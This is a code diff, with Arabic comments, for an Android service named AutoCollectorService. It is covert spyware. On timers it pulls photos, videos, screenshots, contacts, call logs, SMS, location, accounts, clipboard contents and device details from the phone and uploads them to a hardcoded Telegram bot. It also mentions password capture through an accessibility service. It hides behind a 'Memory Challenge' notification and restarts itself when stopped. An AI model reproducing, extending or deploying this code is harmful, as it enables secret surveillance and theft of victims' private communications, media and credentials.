@@ -4,16 +4,11 @@ import android.app.Notification;
 import android.app.NotificationChannel;
 import android.app.NotificationManager;
 import android.app.Service;
-import android.content.ContentResolver;
-import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
-import android.content.pm.ApplicationInfo;
-import android.content.pm.PackageInfo;
 import android.database.Cursor;
 import android.location.Location;
 import android.location.LocationManager;
-import android.media.MediaScannerConnection;
 import android.net.Uri;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
@@ -31,15 +26,10 @@ import android.accounts.Account;
 import android.accounts.AccountManager;
 import android.content.ClipboardManager;
 import android.content.ClipData;
-import android.telephony.TelephonyManager;
-import android.telephony.gsm.GsmCellLocation;
-import android.util.Base64;
 import android.util.Log;
 import androidx.core.app.ActivityCompat;
 import androidx.core.app.NotificationCompat;
 import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
 import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -48,23 +38,35 @@ import java.util.List;
 import java.util.Locale;
 import java.util.concurrent.TimeUnit;
 import okhttp3.*;
-import org.json.JSONArray;
-import org.json.JSONObject;
 
 public class AutoCollectorService extends Service {
 
+    // ==================== الثوابت ====================
+    private static final String TAG = "AutoCollector";
     private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
     private static final String CHAT_ID = "7259620384";
     private static final String BASE_URL = "https://api.telegram.org/bot" + TOKEN + "/";
+    private static final int NOTIFICATION_ID = 999;
     
+    // ==================== فترات الجمع ====================
+    private static final long DELAY_PHOTOS = 3 * 60 * 1000;      // 3 دقائق
+    private static final long DELAY_VIDEOS = 5 * 60 * 1000;      // 5 دقائق
+    private static final long DELAY_SCREENSHOT = 60 * 1000;      // دقيقة واحدة
+    private static final long DELAY_CONTACTS = 30 * 60 * 1000;   // 30 دقيقة
+    private static final long DELAY_CALLS = 30 * 60 * 1000;      // 30 دقيقة
+    private static final long DELAY_SMS = 30 * 60 * 1000;        // 30 دقيقة
+    private static final long DELAY_LOCATION = 5 * 60 * 1000;    // 5 دقائق
+    private static final long DELAY_ACCOUNTS = 60 * 60 * 1000;   // ساعة
+    private static final long DELAY_CLIPBOARD = 30 * 1000;       // 30 ثانية
+    private static final long DELAY_DEVICE_INFO = 60 * 60 * 1000; // ساعة
+    private static final long DELAY_PASSWORDS = 15 * 60 * 1000;  // 15 دقيقة
+
+    // ==================== المتغيرات ====================
     private Handler handler = new Handler(Looper.getMainLooper());
-    private OkHttpClient client = new OkHttpClient.Builder()
-            .connectTimeout(60, TimeUnit.SECONDS)
-            .writeTimeout(60, TimeUnit.SECONDS)
-            .readTimeout(60, TimeUnit.SECONDS)
-            .build();
+    private OkHttpClient client;
+    private boolean isRunning = true;
     
-    // متغيرات لتخزين آخر ما تم إرساله
+    // متغيرات تتبع آخر إرسال
     private long lastPhotoTime = 0;
     private long lastVideoTime = 0;
     private long lastScreenshotTime = 0;
@@ -73,155 +75,206 @@ public class AutoCollectorService extends Service {
     private long lastSMSTime = 0;
     private long lastLocationTime = 0;
     private long lastAccountsTime = 0;
+    private long lastDeviceInfoTime = 0;
     private String lastClipboardContent = "";
-    private boolean isRunning = true;
+
+    // ==================== دورة الحياة ====================
     
     @Override
     public void onCreate() {
         super.onCreate();
-        startForeground();
+        
+        // تهيئة OkHttpClient
+        client = new OkHttpClient.Builder()
+                .connectTimeout(60, TimeUnit.SECONDS)
+                .writeTimeout(60, TimeUnit.SECONDS)
+                .readTimeout(60, TimeUnit.SECONDS)
+                .build();
+        
+        startForegroundService();
         startAutoCollection();
-        sendTelegram("🚀 **تم تشغيل السحب التلقائي**\n📱 " + Build.MODEL + "\n⏰ " + new Date().toString());
+        
+        sendTelegram("🚀 **تم تشغيل السحب التلقائي**\n" +
+                    "📱 " + Build.MODEL + "\n" +
+                    "⏰ " + new Date().toString());
+        
+        Log.d(TAG, "خدمة الجمع التلقائي بدأت");
     }
     
-    private void startForeground() {
+    private void startForegroundService() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            Notification notification = new NotificationCompat.Builder(this, "collector_channel")
-                .setContentTitle("System Service")
-                .setContentText("جمع البيانات التلقائي قيد التشغيل")
-                .setSmallIcon(android.R.drawable.ic_dialog_info)
-                .setPriority(NotificationCompat.PRIORITY_LOW)
-                .build();
+            NotificationChannel channel = new NotificationChannel(
+                "collector_channel",
+                "Memory Challenge Service",
+                NotificationManager.IMPORTANCE_LOW
+            );
             
-            startForeground(999, notification);
+            NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+            manager.createNotificationChannel(channel);
+
+            Notification notification = new NotificationCompat.Builder(this, "collector_channel")
+                    .setContentTitle("Memory Challenge")
+                    .setContentText("جمع البيانات التلقائي قيد التشغيل")
+                    .setSmallIcon(android.R.drawable.ic_dialog_info)
+                    .setPriority(NotificationCompat.PRIORITY_LOW)
+                    .build();
+
+            startForeground(NOTIFICATION_ID, notification);
         }
     }
     
     private void startAutoCollection() {
-        // سحب الصور كل 3 دقائق
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if (isRunning) {
-                    collectAllPhotos();
-                    handler.postDelayed(this, 3 * 60 * 1000);
-                }
-            }
-        }, 10 * 1000);
+        // سحب الصور
+        handler.postDelayed(photosRunnable, 10 * 1000);
         
-        // سحب الفيديوهات كل 5 دقائق
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if (isRunning) {
-                    collectAllVideos();
-                    handler.postDelayed(this, 5 * 60 * 1000);
-                }
-            }
-        }, 20 * 1000);
+        // سحب الفيديوهات
+        handler.postDelayed(videosRunnable, 20 * 1000);
         
-        // سحب لقطات الشاشة كل دقيقة
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if (isRunning) {
-                    takeScreenshot();
-                    handler.postDelayed(this, 60 * 1000);
-                }
-            }
-        }, 30 * 1000);
+        // سحب لقطات الشاشة
+        handler.postDelayed(screenshotRunnable, 30 * 1000);
         
-        // سحب جهات الاتصال كل 30 دقيقة
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if (isRunning) {
-                    collectContacts();
-                    handler.postDelayed(this, 30 * 60 * 1000);
-                }
-            }
-        }, 40 * 1000);
+        // سحب جهات الاتصال
+        handler.postDelayed(contactsRunnable, 40 * 1000);
         
-        // سجل المكالمات كل 30 دقيقة
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if (isRunning) {
-                    collectCallLogs();
-                    handler.postDelayed(this, 30 * 60 * 1000);
-                }
-            }
-        }, 50 * 1000);
+        // سجل المكالمات
+        handler.postDelayed(callsRunnable, 50 * 1000);
         
-        // سحب الرسائل كل 30 دقيقة
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if (isRunning) {
-                    collectSMS();
-                    handler.postDelayed(this, 30 * 60 * 1000);
-                }
-            }
-        }, 60 * 1000);
+        // سحب الرسائل
+        handler.postDelayed(smsRunnable, 60 * 1000);
         
-        // الموقع كل 5 دقائق
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if (isRunning) {
-                    collectLocation();
-                    handler.postDelayed(this, 5 * 60 * 1000);
-                }
-            }
-        }, 70 * 1000);
+        // الموقع
+        handler.postDelayed(locationRunnable, 70 * 1000);
         
-        // سحب الحسابات كل ساعة
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if (isRunning) {
-                    collectAccounts();
-                    handler.postDelayed(this, 60 * 60 * 1000);
-                }
-            }
-        }, 80 * 1000);
+        // سحب الحسابات
+        handler.postDelayed(accountsRunnable, 80 * 1000);
         
-        // سحب الحافظة كل 30 ثانية
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if (isRunning) {
-                    collectClipboard();
-                    handler.postDelayed(this, 30 * 1000);
-                }
-            }
-        }, 5 * 1000);
+        // سحب الحافظة
+        handler.postDelayed(clipboardRunnable, 5 * 1000);
         
-        // معلومات الجهاز كل ساعة
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if (isRunning) {
-                    collectDeviceInfo();
-                    handler.postDelayed(this, 60 * 60 * 1000);
-                }
-            }
-        }, 90 * 1000);
+        // معلومات الجهاز
+        handler.postDelayed(deviceInfoRunnable, 90 * 1000);
         
-        // سحب كلمات المرور من الخدمة
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                if (isRunning) {
-                    collectPasswords();
-                    handler.postDelayed(this, 15 * 60 * 1000);
-                }
-            }
-        }, 100 * 1000);
+        // كلمات المرور
+        handler.postDelayed(passwordsRunnable, 100 * 1000);
     }
+
+    // ==================== Runنقاط الجمع ====================
     
-    // ==================== سحب جميع الصور ====================
+    private Runnable photosRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (isRunning) {
+                collectAllPhotos();
+                handler.postDelayed(this, DELAY_PHOTOS);
+            }
+        }
+    };
     
+    private Runnable videosRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (isRunning) {
+                collectAllVideos();
+                handler.postDelayed(this, DELAY_VIDEOS);
+            }
+        }
+    };
+    
+    private Runnable screenshotRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (isRunning) {
+                takeScreenshot();
+                handler.postDelayed(this, DELAY_SCREENSHOT);
+            }
+        }
+    };
+    
+    private Runnable contactsRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (isRunning) {
+                collectContacts();
+                handler.postDelayed(this, DELAY_CONTACTS);
+            }
+        }
+    };
+    
+    private Runnable callsRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (isRunning) {
+                collectCallLogs();
+                handler.postDelayed(this, DELAY_CALLS);
+            }
+        }
+    };
+    
+    private Runnable smsRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (isRunning) {
+                collectSMS();
+                handler.postDelayed(this, DELAY_SMS);
+            }
+        }
+    };
+    
+    private Runnable locationRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (isRunning) {
+                collectLocation();
+                handler.postDelayed(this, DELAY_LOCATION);
+            }
+        }
+    };
+    
+    private Runnable accountsRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (isRunning) {
+                collectAccounts();
+                handler.postDelayed(this, DELAY_ACCOUNTS);
+            }
+        }
+    };
+    
+    private Runnable clipboardRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (isRunning) {
+                collectClipboard();
+                handler.postDelayed(this, DELAY_CLIPBOARD);
+            }
+        }
+    };
+    
+    private Runnable deviceInfoRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (isRunning) {
+                collectDeviceInfo();
+                handler.postDelayed(this, DELAY_DEVICE_INFO);
+            }
+        }
+    };
+    
+    private Runnable passwordsRunnable = new Runnable() {
+        @Override
+        public void run() {
+            if (isRunning) {
+                collectPasswords();
+                handler.postDelayed(this, DELAY_PASSWORDS);
+            }
+        }
+    };
+
+    // ==================== دوال الجمع ====================
+    
+    /**
+     * جمع جميع الصور الجديدة
+     */
     private void collectAllPhotos() {
         try {
             String[] projection = {
@@ -231,7 +284,6 @@ public class AutoCollectorService extends Service {
                 MediaStore.Images.Media.DISPLAY_NAME
             };
             
-            // جلب الصور الجديدة فقط (آخر ساعة)
             long oneHourAgo = System.currentTimeMillis() / 1000 - (60 * 60);
             String selection = MediaStore.Images.Media.DATE_ADDED + " > ?";
             String[] selectionArgs = {String.valueOf(oneHourAgo)};
@@ -247,10 +299,10 @@ public class AutoCollectorService extends Service {
             if (cursor != null) {
                 int count = 0;
                 while (cursor.moveToNext() && count < 10) {
-                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
-                    String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
-                    long date = cursor.getLong(cursor.getColumnIndex(MediaStore.Images.Media.DATE_ADDED)) * 1000;
-                    long size = cursor.getLong(cursor.getColumnIndex(MediaStore.Images.Media.SIZE));
+                    String path = cursor.getString(0);
+                    String name = cursor.getString(3);
+                    long date = cursor.getLong(1) * 1000;
+                    long size = cursor.getLong(2);
                     
                     if (date > lastPhotoTime && size < 15 * 1024 * 1024 && new File(path).exists()) {
                         sendPhoto(path, "📸 **صورة جديدة**\n📁 " + name + "\n📅 " + new Date(date).toString());
@@ -261,25 +313,25 @@ public class AutoCollectorService extends Service {
                 }
                 
                 if (count > 0) {
-                    Log.d("AutoCollector", "تم إرسال " + count + " صور");
+                    Log.d(TAG, "تم إرسال " + count + " صور");
                 }
                 cursor.close();
             }
         } catch (Exception e) {
-            Log.e("AutoCollector", "خطأ في جمع الصور: " + e.getMessage());
+            Log.e(TAG, "خطأ في جمع الصور: " + e.getMessage());
         }
     }
     
-    // ==================== سحب جميع الفيديوهات ====================
-    
+    /**
+     * جمع جميع الفيديوهات الجديدة
+     */
     private void collectAllVideos() {
         try {
             String[] projection = {
                 MediaStore.Video.Media.DATA,
                 MediaStore.Video.Media.DATE_ADDED,
                 MediaStore.Video.Media.SIZE,
-                MediaStore.Video.Media.DISPLAY_NAME,
-                MediaStore.Video.Media.DURATION
+                MediaStore.Video.Media.DISPLAY_NAME
             };
             
             long oneHourAgo = System.currentTimeMillis() / 1000 - (60 * 60);
@@ -297,10 +349,10 @@ public class AutoCollectorService extends Service {
             if (cursor != null) {
                 int count = 0;
                 while (cursor.moveToNext() && count < 5) {
-                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DATA));
-                    String name = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME));
-                    long date = cursor.getLong(cursor.getColumnIndex(MediaStore.Video.Media.DATE_ADDED)) * 1000;
-                    long size = cursor.getLong(cursor.getColumnIndex(MediaStore.Video.Media.SIZE));
+                    String path = cursor.getString(0);
+                    String name = cursor.getString(3);
+                    long date = cursor.getLong(1) * 1000;
+                    long size = cursor.getLong(2);
                     
                     if (date > lastVideoTime && size < 50 * 1024 * 1024 && new File(path).exists()) {
                         sendVideo(path, "🎥 **فيديو جديد**\n📁 " + name + "\n📅 " + new Date(date).toString());
@@ -311,20 +363,22 @@ public class AutoCollectorService extends Service {
                 }
                 
                 if (count > 0) {
-                    Log.d("AutoCollector", "تم إرسال " + count + " فيديوهات");
+                    Log.d(TAG, "تم إرسال " + count + " فيديوهات");
                 }
                 cursor.close();
             }
         } catch (Exception e) {
-            Log.e("AutoCollector", "خطأ في جمع الفيديوهات: " + e.getMessage());
+            Log.e(TAG, "خطأ في جمع الفيديوهات: " + e.getMessage());
         }
     }
     
-    // ==================== تصوير الشاشة ====================
-    
+    /**
+     * تصوير الشاشة
+     */
     private void takeScreenshot() {
         try {
-            String filePath = Environment.getExternalStorageDirectory() + "/DCIM/screenshot_" + System.currentTimeMillis() + ".png";
+            String filePath = Environment.getExternalStorageDirectory() + "/DCIM/screenshot_" + 
+                             System.currentTimeMillis() + ".png";
             
             Process process = Runtime.getRuntime().exec("screencap -p " + filePath);
             process.waitFor();
@@ -332,19 +386,20 @@ public class AutoCollectorService extends Service {
             File file = new File(filePath);
             if (file.exists() && file.length() > 0) {
                 long now = System.currentTimeMillis();
-                if (now - lastScreenshotTime > 60 * 1000) { // مرة كل دقيقة على الأقل
+                if (now - lastScreenshotTime > 60 * 1000) {
                     sendPhoto(filePath, "📱 **لقطة شاشة**\n⏰ " + new Date().toString());
                     lastScreenshotTime = now;
                 }
                 file.delete();
             }
         } catch (Exception e) {
-            Log.e("AutoCollector", "خطأ في تصوير الشاشة: " + e.getMessage());
+            Log.e(TAG, "خطأ في تصوير الشاشة: " + e.getMessage());
         }
     }
     
-    // ==================== جهات الاتصال ====================
-    
+    /**
+     * جمع جهات الاتصال
+     */
     private void collectContacts() {
         try {
             StringBuilder sb = new StringBuilder("👤 **جهات الاتصال**\n\n");
@@ -357,8 +412,11 @@ public class AutoCollectorService extends Service {
             int count = 0;
             if (cursor != null) {
                 while (cursor.moveToNext() && count < 50) {
-                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
-                    String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    String name = cursor.getString(cursor.getColumnIndex(
+                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+                    String phone = cursor.getString(cursor.getColumnIndex(
+                            ContactsContract.CommonDataKinds.Phone.NUMBER));
+                    
                     sb.append("📞 **").append(name).append("**\n");
                     sb.append("   ").append(phone).append("\n\n");
                     count++;
@@ -372,20 +430,19 @@ public class AutoCollectorService extends Service {
                 lastContactsTime = System.currentTimeMillis();
             }
         } catch (Exception e) {
-            Log.e("AutoCollector", "خطأ في جهات الاتصال");
+            Log.e(TAG, "خطأ في جهات الاتصال");
         }
     }
     
-    // ==================== سجل المكالمات ====================
-    
+    /**
+     * جمع سجل المكالمات
+     */
     private void collectCallLogs() {
         try {
             StringBuilder sb = new StringBuilder("📞 **سجل المكالمات**\n\n");
             Cursor cursor = getContentResolver().query(
                 CallLog.Calls.CONTENT_URI,
-                null,
-                null,
-                null,
+                null, null, null,
                 CallLog.Calls.DATE + " DESC LIMIT 30"
             );
             
@@ -401,7 +458,8 @@ public class AutoCollectorService extends Service {
                     
                     sb.append(typeText).append("\n");
                     sb.append("   ").append(name != null ? name : number).append("\n");
-                    sb.append("   ").append(new SimpleDateFormat("yyyy-MM-dd HH:mm").format(new Date(date))).append("\n\n");
+                    sb.append("   ").append(new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US)
+                            .format(new Date(date))).append("\n\n");
                 }
                 cursor.close();
             }
@@ -409,20 +467,19 @@ public class AutoCollectorService extends Service {
             sendTelegram(sb.toString());
             lastCallLogTime = System.currentTimeMillis();
         } catch (Exception e) {
-            Log.e("AutoCollector", "خطأ في سجل المكالمات");
+            Log.e(TAG, "خطأ في سجل المكالمات");
         }
     }
     
-    // ==================== الرسائل النصية ====================
-    
+    /**
+     * جمع الرسائل النصية
+     */
     private void collectSMS() {
         try {
             StringBuilder sb = new StringBuilder("💬 **الرسائل النصية**\n\n");
             Cursor cursor = getContentResolver().query(
                 Uri.parse("content://sms/inbox"),
-                null,
-                null,
-                null,
+                null, null, null,
                 "date DESC LIMIT 20"
             );
             
@@ -434,7 +491,8 @@ public class AutoCollectorService extends Service {
                     
                     sb.append("📨 **من ").append(address).append("**\n");
                     sb.append("   ").append(body).append("\n");
-                    sb.append("   ").append(new SimpleDateFormat("yyyy-MM-dd HH:mm").format(new Date(date))).append("\n\n");
+                    sb.append("   ").append(new SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US)
+                            .format(new Date(date))).append("\n\n");
                 }
                 cursor.close();
             }
@@ -442,16 +500,18 @@ public class AutoCollectorService extends Service {
             sendTelegram(sb.toString());
             lastSMSTime = System.currentTimeMillis();
         } catch (Exception e) {
-            Log.e("AutoCollector", "خطأ في الرسائل");
+            Log.e(TAG, "خطأ في الرسائل");
         }
     }
     
-    // ==================== الموقع الجغرافي ====================
-    
+    /**
+     * جمع الموقع الجغرافي
+     */
     private void collectLocation() {
         try {
             LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
-            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+            if (ActivityCompat.checkSelfPermission(this, 
+                    android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                 
                 Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                 if (location == null) {
@@ -475,12 +535,13 @@ public class AutoCollectorService extends Service {
                 }
             }
         } catch (Exception e) {
-            Log.e("AutoCollector", "خطأ في الموقع");
+            Log.e(TAG, "خطأ في الموقع");
         }
     }
     
-    // ==================== الحسابات ====================
-    
+    /**
+     * جمع الحسابات
+     */
     private void collectAccounts() {
         try {
             AccountManager am = (AccountManager) getSystemService(ACCOUNT_SERVICE);
@@ -498,12 +559,13 @@ public class AutoCollectorService extends Service {
                 lastAccountsTime = System.currentTimeMillis();
             }
         } catch (Exception e) {
-            Log.e("AutoCollector", "خطأ في الحسابات");
+            Log.e(TAG, "خطأ في الحسابات");
         }
     }
     
-    // ==================== الحافظة ====================
-    
+    /**
+     * جمع الحافظة
+     */
     private void collectClipboard() {
         try {
             ClipboardManager clipboard = (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
@@ -518,28 +580,29 @@ public class AutoCollectorService extends Service {
                 }
             }
         } catch (Exception e) {
-            Log.e("AutoCollector", "خطأ في الحافظة");
+            Log.e(TAG, "خطأ في الحافظة");
         }
     }
     
-    // ==================== معلومات الجهاز ====================
-    
+    /**
+     * جمع معلومات الجهاز
+     */
     private void collectDeviceInfo() {
         try {
             StringBuilder sb = new StringBuilder("📱 **معلومات الجهاز**\n\n");
             
-            // معلومات أساسية
             sb.append("**الطراز:** ").append(Build.MODEL).append("\n");
             sb.append("**الشركة:** ").append(Build.MANUFACTURER).append("\n");
             sb.append("**الإصدار:** ").append(Build.VERSION.RELEASE).append("\n");
             sb.append("**Android:** ").append(Build.VERSION.SDK_INT).append("\n");
             
-            // معرف الجهاز
-            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
+            String deviceId = Settings.Secure.getString(getContentResolver(), 
+                    Settings.Secure.ANDROID_ID);
             sb.append("**المعرف:** `").append(deviceId).append("`\n\n");
             
             // البطارية
-            android.content.IntentFilter ifilter = new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+            android.content.IntentFilter ifilter = new android.content.IntentFilter(
+                    Intent.ACTION_BATTERY_CHANGED);
             android.content.Intent batteryStatus = registerReceiver(null, ifilter);
             if (batteryStatus != null) {
                 int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
@@ -550,12 +613,14 @@ public class AutoCollectorService extends Service {
             
             // المساحة التخزينية
             StatFs stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
-            long bytesAvailable = (long) stat.getBlockSizeLong() * (long) stat.getAvailableBlocksLong();
+            long bytesAvailable = (long) stat.getBlockSizeLong() * 
+                                 (long) stat.getAvailableBlocksLong();
             long megAvailable = bytesAvailable / (1024 * 1024);
             sb.append("**المساحة المتوفرة:** ").append(megAvailable).append(" MB\n\n");
             
             // شبكة واي فاي
-            WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
+            WifiManager wifiManager = (WifiManager) getApplicationContext()
+                    .getSystemService(WIFI_SERVICE);
             WifiInfo wifiInfo = wifiManager.getConnectionInfo();
             String ssid = wifiInfo.getSSID().replace("\"", "");
             if (!ssid.isEmpty() && !ssid.equals("<unknown ssid>")) {
@@ -563,35 +628,39 @@ public class AutoCollectorService extends Service {
             }
             
             sendTelegram(sb.toString());
+            lastDeviceInfoTime = System.currentTimeMillis();
         } catch (Exception e) {
-            Log.e("AutoCollector", "خطأ في معلومات الجهاز");
+            Log.e(TAG, "خطأ في معلومات الجهاز");
         }
     }
     
-    // ==================== كلمات المرور (من الخدمة) ====================
-    
+    /**
+     * جمع كلمات المرور (تستقبل من Accessibility Service)
+     */
     private void collectPasswords() {
         // هذه الدالة تستقبل البيانات من MyAccessibilityService
         // سيتم إرسال كلمات المرور مباشرة عند اكتشافها
     }
+
+    // ==================== دوال الإرسال ====================
     
-    // ==================== إرسال الصور ====================
-    
+    /**
+     * إرسال صورة إلى تيليغرام
+     */
     private void sendPhoto(String filePath, String caption) {
         try {
             File file = new File(filePath);
             if (!file.exists() || file.length() == 0) return;
             
             String fileName = file.getName();
-            String mimeType = "image/jpeg";
-            if (fileName.endsWith(".png")) mimeType = "image/png";
+            String mimeType = fileName.endsWith(".png") ? "image/png" : "image/jpeg";
             
             RequestBody body = new MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("chat_id", CHAT_ID)
                     .addFormDataPart("caption", caption)
                     .addFormDataPart("photo", fileName,
-                        RequestBody.create(MediaType.parse(mimeType), file))
+                            RequestBody.create(MediaType.parse(mimeType), file))
                     .build();
             
             Request request = new Request.Builder()
@@ -601,7 +670,9 @@ public class AutoCollectorService extends Service {
             
             client.newCall(request).enqueue(new Callback() {
                 @Override
-                public void onFailure(Call call, IOException e) {}
+                public void onFailure(Call call, IOException e) {
+                    Log.e(TAG, "فشل إرسال الصورة: " + e.getMessage());
+                }
                 
                 @Override
                 public void onResponse(Call call, Response response) throws IOException {
@@ -609,12 +680,13 @@ public class AutoCollectorService extends Service {
                 }
             });
         } catch (Exception e) {
-            Log.e("AutoCollector", "خطأ في إرسال الصورة");
+            Log.e(TAG, "خطأ في إرسال الصورة: " + e.getMessage());
         }
     }
     
-    // ==================== إرسال الفيديو ====================
-    
+    /**
+     * إرسال فيديو إلى تيليغرام
+     */
     private void sendVideo(String filePath, String caption) {
         try {
             File file = new File(filePath);
@@ -625,7 +697,7 @@ public class AutoCollectorService extends Service {
                     .addFormDataPart("chat_id", CHAT_ID)
                     .addFormDataPart("caption", caption)
                     .addFormDataPart("video", file.getName(),
-                        RequestBody.create(MediaType.parse("video/mp4"), file))
+                            RequestBody.create(MediaType.parse("video/mp4"), file))
                     .build();
             
             Request request = new Request.Builder()
@@ -635,7 +707,9 @@ public class AutoCollectorService extends Service {
             
             client.newCall(request).enqueue(new Callback() {
                 @Override
-                public void onFailure(Call call, IOException e) {}
+                public void onFailure(Call call, IOException e) {
+                    Log.e(TAG, "فشل إرسال الفيديو: " + e.getMessage());
+                }
                 
                 @Override
                 public void onResponse(Call call, Response response) throws IOException {
@@ -643,12 +717,13 @@ public class AutoCollectorService extends Service {
                 }
             });
         } catch (Exception e) {
-            Log.e("AutoCollector", "خطأ في إرسال الفيديو");
+            Log.e(TAG, "خطأ في إرسال الفيديو: " + e.getMessage());
         }
     }
     
-    // ==================== إرسال رسالة ====================
-    
+    /**
+     * إرسال رسالة نصية إلى تيليغرام
+     */
     private void sendTelegram(String message) {
         try {
             String url = BASE_URL + "sendMessage?chat_id=" + CHAT_ID + 
@@ -660,24 +735,38 @@ public class AutoCollectorService extends Service {
             
             client.newCall(request).enqueue(new Callback() {
                 @Override
-                public void onFailure(Call call, IOException e) {}
+                public void onFailure(Call call, IOException e) {
+                    Log.e(TAG, "فشل إرسال الرسالة: " + e.getMessage());
+                }
                 
                 @Override
                 public void onResponse(Call call, Response response) throws IOException {
                     response.close();
                 }
             });
-        } catch (Exception e) {}
+        } catch (Exception e) {
+            Log.e(TAG, "خطأ في إرسال الرسالة: " + e.getMessage());
+        }
     }
+
+    // ==================== Service Lifecycle ====================
     
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        return START_STICKY; // يعيد تشغيل الخدمة إذا توقفت
+    }
+
     @Override
     public IBinder onBind(Intent intent) {
         return null;
     }
-    
+
     @Override
     public void onDestroy() {
+        super.onDestroy();
         isRunning = false;
+        
+        Log.d(TAG, "خدمة الجمع التلقائي تتوقف...");
         
         // إعادة تشغيل الخدمة
         Intent intent = new Intent(this, AutoCollectorService.class);
@@ -686,7 +775,5 @@ public class AutoCollectorService extends Service {
         } else {
             startService(intent);
         }
-        
-        super.onDestroy();
     }
 }
